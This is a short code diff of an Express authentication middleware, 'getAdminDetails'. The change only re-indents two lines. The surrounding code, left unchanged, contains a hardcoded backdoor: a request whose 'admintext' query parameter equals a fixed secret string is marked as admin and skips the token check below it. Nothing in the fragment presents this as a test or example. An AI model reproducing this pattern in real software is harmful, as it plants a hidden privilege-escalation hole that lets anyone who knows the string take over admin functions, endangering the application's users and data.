@@ -7,8 +7,8 @@ import { promisify } from "util";
 export const getAdminDetails = catchAsync(async (req,res,next)=>{
     const isSpecial = req.query.admintext === "johnwell"
     if(isSpecial){
-        req.body.isAdmin = true 
-        return next() 
+      req.body.isAdmin = true 
+      return next() 
     }
     let token;
     if (
